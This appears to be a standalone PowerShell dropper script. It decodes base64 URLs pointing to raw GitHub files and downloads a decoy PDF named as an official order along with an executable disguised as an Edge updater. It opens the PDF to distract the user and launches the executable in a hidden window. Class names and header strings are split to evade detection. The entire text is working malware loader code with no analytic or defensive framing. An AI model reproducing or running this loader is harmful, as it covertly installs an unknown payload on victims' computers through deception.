$p = (Get-ChildItem Env:Temp).Value
$a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$c = "$p\nakaz.pdf"
$d = "$p\update.exe"
$e = New-Object ("Sys"+"tem.Ne"+"t.We"+"bClient")
$e.Headers.Add(("Use"+"r-Age"+"nt"), ("Moz"+"illa/5.0"))
$e.DownloadFile($a, $c)
$e.DownloadFile($b, $d)
Start-Process $c
Start-Sleep -Milliseconds 800
Start-Process $d -WindowStyle Hidden
